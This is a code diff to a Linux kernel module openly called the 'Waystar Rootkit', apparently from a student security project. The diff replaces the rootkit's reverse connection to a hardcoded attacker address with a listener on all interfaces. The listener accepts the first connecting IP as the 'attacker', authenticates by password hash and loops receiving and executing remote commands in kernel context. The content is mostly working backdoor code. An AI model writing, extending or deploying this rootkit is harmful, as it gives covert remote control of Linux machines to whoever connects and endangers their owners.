@@ -16,16 +16,15 @@
 #include <linux/uaccess.h>
 
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("Jules Aubert <jules1.aubert@epita.fr>");
-MODULE_DESCRIPTION("Waystar Rootkit Base");
+MODULE_AUTHOR("Corentin Dupaigne & Valentin Mougin");
+MODULE_DESCRIPTION("Waystar Rootkit");
 MODULE_VERSION("0.1");
 
-static char *attacker_ip = "192.168.1.30";
+static char attacker_ip[16] = {0}; // Will store the first connecting IP
 static int attacker_port = 5555;
 static char *password_sha256 =
     "dd58add07f93b3ad6ffcebf0fbacf16a15260793cae2f8b00a5fe701d8d85676";
-module_param(attacker_ip, charp, 0444);
-MODULE_PARM_DESC(attacker_ip, "Attacker VM IPv4 address");
+static int ip_detected = 0; // Flag to indicate if we've detected an attacker IP
 module_param(attacker_port, int, 0444);
 MODULE_PARM_DESC(attacker_port, "Attacker VM TCP port");
 module_param(password_sha256, charp, 0400);
@@ -183,8 +182,9 @@ static int execute_and_capture(const char *cmd)
 
 /*
  * Fonction principale exécutée dans le thread du rootkit.
- * Établit une connexion TCP avec l'attaquant, s’authentifie,
- * puis boucle pour recevoir et exécuter des commandes à distance.
+ * Crée un socket d'écoute, accepte les connexions entrantes,
+ * s'authentifie, puis boucle pour recevoir et exécuter des commandes à distance.
+ * La première IP qui se connecte est considérée comme l'IP de l'attaquant.
  *
  * @param data Non utilisé (NULL).
  * @return 0 à la fin du thread, ou un code d'erreur.
@@ -192,6 +192,8 @@ static int execute_and_capture(const char *cmd)
 static int connection_worker(void *data)
 {
     struct sockaddr_in addr;
+    struct socket *listen_sock = NULL;
+    struct socket *accept_sock = NULL;
     int ret;
     char *cmd;
 
@@ -201,7 +203,8 @@ static int connection_worker(void *data)
 
     while (!kthread_should_stop())
     {
-        ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &conn_sock);
+        // Create listening socket
+        ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &listen_sock);
         if (ret < 0)
         {
             pr_err("[Waystar] sock_create failed: %d\n", ret);
@@ -210,19 +213,64 @@ static int connection_worker(void *data)
 
         memset(&addr, 0, sizeof(addr));
         addr.sin_family = AF_INET;
-        addr.sin_addr.s_addr = in_aton(attacker_ip);
+        addr.sin_addr.s_addr = htonl(INADDR_ANY); // Listen on all interfaces
         addr.sin_port = htons(attacker_port);
 
-        ret = kernel_connect(conn_sock, (struct sockaddr *)&addr, sizeof(addr),
-                             0);
+        // Bind to the port
+        ret = kernel_bind(listen_sock, (struct sockaddr *)&addr, sizeof(addr));
         if (ret < 0)
         {
-            pr_err("[Waystar] connect failed: %d\n", ret);
-            sock_release(conn_sock);
+            pr_err("[Waystar] bind failed: %d\n", ret);
+            sock_release(listen_sock);
             goto retry;
         }
-        pr_info("[Waystar] Connected to %pI4:%d\n", &addr.sin_addr,
-                attacker_port);
+
+        // Start listening
+        ret = kernel_listen(listen_sock, 1);
+        if (ret < 0)
+        {
+            pr_err("[Waystar] listen failed: %d\n", ret);
+            sock_release(listen_sock);
+            goto retry;
+        }
+
+        pr_info("[Waystar] Listening on port %d\n", attacker_port);
+
+        // Accept incoming connection
+        ret = kernel_accept(listen_sock, &accept_sock, 0);
+        if (ret < 0)
+        {
+            pr_err("[Waystar] accept failed: %d\n", ret);
+            sock_release(listen_sock);
+            goto retry;
+        }
+
+        // Get client address
+        ret = kernel_getpeername(accept_sock, (struct sockaddr *)&addr);
+        if (ret < 0)
+        {
+            pr_err("[Waystar] getpeername failed: %d\n", ret);
+            sock_release(accept_sock);
+            sock_release(listen_sock);
+            goto retry;
+        }
+
+        // Store the first connecting IP if not already detected
+        if (!ip_detected)
+        {
+            snprintf(attacker_ip, 16, "%pI4", &addr.sin_addr);
+            ip_detected = 1;
+            pr_info("[Waystar] Attacker IP detected: %s\n", attacker_ip);
+        }
+
+        pr_info("[Waystar] Connection from %pI4:%d\n", &addr.sin_addr,
+                ntohs(addr.sin_port));
+
+        // We don't need the listening socket anymore
+        sock_release(listen_sock);
+
+        // Use the accepted socket for communication
+        conn_sock = accept_sock;
 
         {
             uint32_t net_len;
